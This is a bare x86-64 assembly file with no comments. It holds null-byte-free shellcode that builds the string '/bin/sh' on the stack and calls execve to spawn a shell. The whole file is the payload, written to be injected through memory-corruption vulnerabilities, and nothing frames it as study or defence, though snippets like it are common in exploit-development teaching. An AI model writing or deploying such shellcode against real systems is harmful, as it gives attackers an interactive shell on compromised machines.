section .text
    global _start

_start:
    xor     rdx, rdx
    xor     rax, rax
    xor     rsi, rsi
    mov     qword rbx, '//bin/sh'
    shr     rbx, 0x8
    push    rbx
    mov     rdi, rsp
    mov     al, 0x3b
    syscall
